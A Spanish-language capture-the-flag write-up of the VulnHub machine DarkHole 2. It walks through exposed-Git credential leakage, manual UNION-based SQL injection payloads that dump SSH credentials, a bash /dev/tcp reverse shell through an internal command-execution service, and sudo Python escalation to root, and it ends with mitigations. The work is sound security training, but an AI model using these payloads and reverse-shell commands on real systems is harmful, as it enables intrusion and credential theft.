---
title: DarkHole 2 - Writeup
date: 2025-10-09
tags:
  - writeup
  - vulnhub
  - sqli
  - git-enumeration
  - ssh
  - privilege-escalation
  - web-exploitation
related:
  - "[[SQLi-Manual]]"
  - "[[Git-Reconnaissance]]"
  - "[[Linux-Privesc]]"
  - "[[SSH-Techniques]]"
references:
  - https://www.vulnhub.com/entry/darkhole-2,740/
---
> [!INFO] Información General
>Aquí encontrarás un Writeup de como hackear la máquina "darkhole_2" de VulnHub. A lo largo de la cual aprenderás a como funcionan diversos ataques de inyección SQL, en que consiste la enumeración básica de subdominios y nos aprovecharemos de un servicios expuesto bajo el puerto 9999 para realizar una escalada de privilegios.

![[cover.png]]

---
## Objetivo

- Comprometer la máquina virtual [DarkHole_2](https://www.vulnhub.com/entry/darkhole-2,740/).
- Obtener acceso inicial mediante enumeración web.
- Escalar privilegios hasta root mediante abuso de servicios locales.
- Capturar las flags user.txt y root.txt

---
## Preparativos
- Máquina Virtual en VMWare.

---
# Informe General:

> [!Abstract] Resumen Técnico
> Se obtuvo acceso inicial mediante credenciales hardcodeadas extraídas de commits de Git expuestos en la aplicación web, esto llevó a una explotación de una inyección SQL manual (Burp Suite) en el parámetro "id" del dashboard. Esto permitió obtener credenciales SSH del usuario "jehad". La escalada de privilegios se logró abusando de un servicio PHP interno ejecutándose como el usuario "losy" bajo el puerto 9999, seguido de una explotación de permisos para ejecutar Python como root y lograr una shell sin limites.
---
## Información y Reconocimiento

### Alcance:
- Host objetivo: 
	- Máquina virtual: darkhole_2 en red local `vmnet1`
- Restricciones: 
	- Entorno de laboratorio local, sin restricciones.

### I. Identificación del Target

Lo primero que debemos hacer es la fase de reconocimiento, esto es indispensable para trazar el mapa de la infraestructura objetivo y saber exactamente a que nos estamos enfrentando. Casi siempre tu primer paso será determinar la dirección IP de la máquina objetivo, en mi caso será la maquina "`darkhole_2`" ubicada en mi red local (`vmnet1`).

Comando utilizado:
```
arp-scan -I vmnet1 --localnet
```

Parámetros:
- `arp-scan`: Herramienta de reconocimiento de red
- `-I`: Especifica el adaptador de red a escanear
- `--localnet`: Indica escaneo de toda la red local

![[darkhole_2.1.png]]
	El escaneo identifica la máquina objetivo en "`172.16.23.128`" dentro de la red `vmnet1`.

### Escaneo de Puertos

Una vez sabiendo la IP de la maquina, es bueno proceder a un escaneo exhaustivo para identificar los servicios en ejecución y obtener información de versiones. 

Comando utilizado:
```
nmap -p- --open -sVC -T4 -vvv -n -Pn 172.16.23.128
```

Parámetros:
- `nmap`: Herramienta de escaneo de redes.
- `-p- --open`: Escanea los 65535 puertos y reporta solo los abiertos.
- `-sVC`: Detecta servicios y ejecuta scripts básicos de reconocimiento
- `-T4`: Plantilla de velocidad agresiva
- `-vvv`: Salida verbose en tiempo real, útil para ver información en tiempo real.
- `-n`: Deshabilita resolución DNS para acelerar el escaneo
- `-Pn`: Omite host discovery y fuerza el reconocimiento de puertos

![[darkhole_2.2.png]]

Resultados resumidos:

| Puerto | Protocolo | Servicio     | Versión                 | Observaciones                     |
| :----: | :-------: | :----------- | :---------------------- | :-------------------------------- |
| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto con creds |
| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web "DarkHole V2"      |

### Puerto 80 - Análisis HTTP

Un puerto 80 abierto normalmente quiere decir que el servidor está hosteando un servicio Web. Esto quiere decir que si entramos al navegador y colocamos la IP seguramente encontremos una página web.

Confirmación de Puerto 80 abierto:
```
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
```

![[darkhole_2.3.png]]
	Se identifica una aplicación web activa con TTL de 64 (indicador de sistema Linux) y servidor Apache httpd 2.4.41 corriendo sobre Sistema Ubuntu.

### Puerto 22 - SSH

Puerto 22 abierto:
```
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

Puerto SSH estándar disponible para acceso remoto con credenciales válidas.

### Enumeración de Repositorio Git

Los scripts básicos de reconocimiento de nmap revelaron información crítica:
```
|_http-title: DarkHole V2
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   172.16.23.128:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the..
|_    Last commit message: i changed login.php file for more secure
```

> [!warning] Repositorio Git Expuesto
> Se detectó un directorio .git accesible públicamente en http://172.16.23.128/.git/ con commits históricos potencialmente sensibles.
> 
![[darkhole_2.4.png]]

Siempre que encuentres algún directorio de git en ulgún proyecto puede valer la penar echarle un ojo a lo contiene, puede que haya guardado/borrado información sensibles y es justo lo que vamos a averiguar. Para ellos hay varias formas de hacerlo, yo procederé a descargar el repositorio completo para un análisis forense:

Comando para descargar repositorio:
```
wget -r http://172.16.23.128/.git/
```
![[darkhole_2.5.png]]
	Descargamos con éxito el proyecto y podemos ver su contenido.
### Análisis de Commits Git

Como queremos ver si hay información sensible dentro del proyecto solo debemos ver un log del mismo, cosa que se puede hacer de forma muy sencilla.

Comando para revisar logs:
```
git log
```
![[darkhole_2.6.png]]

El historial de Git reveló 3 commits:

1. `0f1d821f48a9cf662f285457a5ce9af6b9feb2c4`: HEAD actual del proyecto
2. `a4d900a8d85e8938d3601f3cef113ee293028e10`: "I added login.php file with default credentials". **¡Información critica!**
3. `aa2a5f3aa15bb402f2b90a07d86af57436d64917`: "First Initialize" (commit inicial)

### Enumeración de Subdominios

El commit anterior nos indica que han agregado unas credenciales al archivo "`login.php`". Ya tenemos una pista de donde puede estar las credenciales, pero antes realicemos un último script basico de enumeración de nmap:

Comando:
```
nmap --script http-enum 172.16.23.128
```
![[darkhole_2.7.png]]
	`--script`: Me permite indicarle a nmap un script a ejecutar.
	`http-enum`: Script de enumeración de subdominios básicos.

Resultados:
```
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /.git/HEAD: Git folder
|   /config/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /style/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

Se confirma el subdominio "/login.php" mencionado en el commit.

![[darkhole_2.8.png]]
	Tenemos una Login page, la cual seguramente tiene que ver con las credenciales anteriormente mencionadas. 
### Leak de Credenciales en Git

Ya con toda esta información está más que claro que necesitamos las credenciales para iniciar sesión en la página web, para esto verifiquemos el contenido del commit anterior:

Comando:
```
git show a4d900a8d85e8938d3601f3cef113ee293028e10
```
![[darkhole_2.9.png]]

> [!danger] Credenciales Hardcodeadas Expuestas
> El commit reveló credenciales de administrador embebidas en el código fuente del archivo login.php. Dando así paso al 2do ataque.

Fragmento del código encontrado:
```
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
+        header("location:dashboard.php");
+        die();
```

Credenciales obtenidas:
- Email: lush@admin.com
- Password: 321

---

## Acceso Inicial (Explotación)

### Identificación de la Vulnerabilidad

- Tipo: Inyección SQL (SQLi) manual
- Ubicación: Parámetro id en http://172.16.23.128/dashboard.php?id=1
- Evidencia: Las credenciales lush@admin.com:321 permitieron acceso al dashboard

![[darkhole_2.10.png]]

El dashboard presenta un parámetro id en la URL susceptible a inyección SQL.

### Explotación con Burp Suite

![[darkhole_2.11.png]]

Se interceptó la petición GET con Burp Suite y se activó el modo Repeater para pruebas de SQLi manual.

#### Proceso de Inyección SQL

**Paso 1 - Enumeración de usuarios:**

Solicitud modificada:
```
GET /dashboard.php?id=2 HTTP/1.1
```

![[darkhole_2.12.png]]

Respuesta: 200 OK. Se accedió al perfil de otro usuario con campos vacíos.

**Paso 2 - Conteo de columnas:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+order+by+6--+- HTTP/1.1
```

Se identificaron 6 columnas activas mediante pruebas incrementales hasta error 500.

**Paso 3 - Identificación de campos inyectables:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,3,4,5,6--+- HTTP/1.1
```

![[darkhole_2.13.png]]

Los campos 2, 3, 5 y 6 son inyectables y se muestran en la respuesta.

**Paso 4 - Enumeración de bases de datos:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+- HTTP/1.1
```

![[darkhole_2.14.png]]

Bases de datos identificadas: mysql, information_schema, performance_schema, sys, darkhole_2 (objetivo).

**Paso 5 - Enumeración de tablas en darkhole_2:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+- HTTP/1.1
```
![[darkhole_2.15.png]]

Tablas identificadas: ssh, users.

**Paso 6 - Enumeración de columnas en tabla ssh:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema%3d'darkhole_2'+and+table_name%3d'ssh'--+- HTTP/1.1
```
![[darkhole_2.16.png]]
	Columnas en tabla ssh: id, user, pass.

**Paso 7 - Extracción de credenciales SSH:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(id,0x3a,user,0x3a,pass),4,5,6+from+darkhole_2.ssh--+- HTTP/1.1
```
![[darkhole_2.17.png]]

> [!success] Credenciales SSH Obtenidas
> Usuario: jehad  
> Contraseña: fool

### Obtención de Shell SSH

Comando:
```
ssh jehad@172.16.23.128
```
![[darkhole_2.18.png]]
	Acceso exitoso a la máquina como usuario jehad.

---

## Post-Explotación y Privesc

### Enumeración Interna

**Inventario del sistema:**

Comando para ver kernel:

uname -a

Resultado: Linux darkhole 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64

Comando para ver versión del SO:

cat /etc/os-release

Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)

Comando para verificar privilegios sudo:

sudo -l

Resultado: El usuario jehad no tiene permisos sudo.

Comando para ver grupos:

id

Resultado: jehad no pertenece a grupos privilegiados.

Comando para listar usuarios:

cat /etc/passwd

Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).

Comando para ver historial:

history

![[darkhole_2.19.png]]

Comandos críticos en el historial:
- cd /home/losy
- cd /opt/web
- curl "http://localhost:9999/?cmd=id"
- ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129

> [!tip] Servicio Interno Detectado
> Existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.

Comando para listar puertos en escucha:

netstat -tulpn

![[darkhole_2.20.png]]

Confirmación: servicio en LISTEN en puerto 9999.

Comando para ver procesos:
```
htop
```

![[darkhole_2.21.png]]

El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.

Comandos para revisar el script PHP:
```
cd /opt/web
cat index.php
```
![[darkhole_2.22.png]]

Script PHP simple para ejecución remota de comandos vía parámetro cmd.

### Vector de Escalada

Exploración del directorio home:
![[darkhole_2.23.png]]
	Se encontró la flag user.txt en /home/.

#### Explotación del Servicio Interno

Prueba de concepto con curl:

curl "http://localhost:9999/?cmd=id"

![[darkhole_2.24.png]]

El comando se ejecuta como usuario losy, confirmando RCE.

#### Reverse Shell como losy

Listener en máquina atacante:

nc -lvnp 443

![[darkhole_2.25.png]]

Payload desde consola de jehad (URL encoded):

curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"

![[darkhole_2.26.png]]

Shell inversa obtenida como losy.

#### Estabilización de TTY

Comandos para estabilizar la shell:

/usr/bin/script -qc /bin/bash /dev/null

Luego CTRL+Z y ejecutar:

stty raw -echo; fg

Finalmente:

export TERM=xterm

#### Análisis del Historial de losy

Comando:

history

![[darkhole_2.27.png]]

> [!danger] Información Crítica en Historial
> Comandos encontrados:
> 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
> 2. sudo python3 -c 'import os; os.system("/bin/sh")'
> 3. P0assw0rd losy:gang (credenciales expuestas)

El usuario losy tiene permisos sudo para ejecutar Python como root.

### Escalada a Root

![[darkhole_2.0.png]]

Comando para obtener shell root:

sudo python3 -c 'import os; os.system("/bin/sh")'

Contraseña usada: gang

Shell de root obtenida. Flag root.txt capturada en /root.

---

## Evidencias

Comando whoami ejecutado como root:

root

Comando hostname:

darkhole

Flags capturadas:
- user.txt: [capturada en /home/]
- root.txt: [capturada en /root/]

> [!tip] Buenas prácticas de evidencia
> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla y timestamps para reproducibilidad.

---

## Conclusiones

**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede filtrar credenciales hardcodeadas. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.

**Complejidad real vs marcada:** La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.

**Mejoras para próximos writeups:** Incluir timings de cada fase, automatizar la extracción de datos con sqlmap como verificación paralela, y documentar intentos fallidos para mostrar el proceso real de pentesting.

> [!note] Mapa mental
> Técnicas relacionadas: [[Git-Enumeration]], [[SQLi-Manual]], [[SQLi-Union-Based]], [[Linux-Internal-Services]], [[Python-Sudo-Privesc]], [[SSH-Lateral-Movement]]

---

## Mitigación y Recomendaciones

**Repositorio Git expuesto:** Eliminar completamente el directorio .git de servidores en producción o bloquear el acceso mediante .htaccess. Nunca commitear credenciales en código fuente; usar variables de entorno o gestores de secretos.

**Inyección SQL:** Implementar consultas preparadas (prepared statements) en todas las interacciones con la base de datos. Validar y sanitizar todas las entradas del usuario mediante whitelists. Aplicar principio de mínimo privilegio en cuentas de base de datos.

**Servicio interno sin autenticación:** Implementar autenticación obligatoria en servicios internos. Usar firewalls locales para restringir acceso solo a procesos autorizados. No ejecutar servicios web como usuarios privilegiados.

**Historial de bash con credenciales:** Configurar HISTCONTROL=ignorespace y anteponer espacio a comandos sensibles. Implementar rotación de contraseñas y prohibir el uso de credenciales en comandos directos.

**Abuso de sudo con Python:** Restringir comandos sudo a scripts específicos sin capacidad de importar módulos arbitrarios. Revisar configuración de sudoers y eliminar permisos innecesarios. Implementar políticas de seguridad con SELinux o AppArmor.

---

## Herramientas Utilizadas

- arp-scan
- nmap
- wget
- git
- Burp Suite (Repeater)
- curl
- netcat
- ssh
- htop
- netstat

Checklist de flujo:
- [x] Reconocimiento de red
- [x] Escaneo de puertos
- [x] Enumeración web
- [x] Análisis de repositorio Git
- [x] Explotación de credenciales
- [x] Inyección SQL manual
- [x] Obtención de shell SSH
- [x] Enumeración interna
- [x] Identificación de servicios locales
- [x] Reverse shell lateral
- [x] Escalada a root via sudo
- [x] Captura de flags
- [x] Documentación y mitigación

---

## Anexos

### Payloads SQLi Utilizados

Enumeración de columnas:
2'+order+by+6--+-

Union select básico:
2'+union+select+1,2,3,4,5,6--+-

Extracción de bases de datos:
2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+-

Extracción de tablas:
2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema='darkhole_2'--+-

Extracción de columnas:
2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema='darkhole_2'+and+table_name='ssh'--+-

Dump de credenciales:
2'+union+select+1,2,group_concat(id,0x3a,user,0x3a,pass),4,5,6+from+darkhole_2.ssh--+-

### Reverse Shell Payload

Comando original:
bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'

URL encoded:
bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'

### Comandos de Estabilización TTY

/usr/bin/script -qc /bin/bash /dev/null

Luego CTRL+Z

stty raw -echo; fg
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116

### Notas Rápidas

- El repositorio Git contenía 3 commits; solo el segundo contenía credenciales
- La tabla ssh en la BD estaba específicamente diseñada para almacenar creds de acceso remoto
- El servicio PHP en puerto 9999 no requería autenticación ni validaba comandos
- El usuario losy tenía contraseña débil y permisos sudo peligrosos

---

## Metadatos de Navegación

- Relacionados: [[VulnHub-Writeups]], [[Web-Exploitation]], [[SQLi-Techniques]], [[Linux-Privesc-Methods]], [[Git-Security]]
- Palabras clave: VulnHub, DarkHole, SQLi, Git, SSH, Reverse Shell, Sudo Privesc, Python Exploitation, Ubuntu 20.04
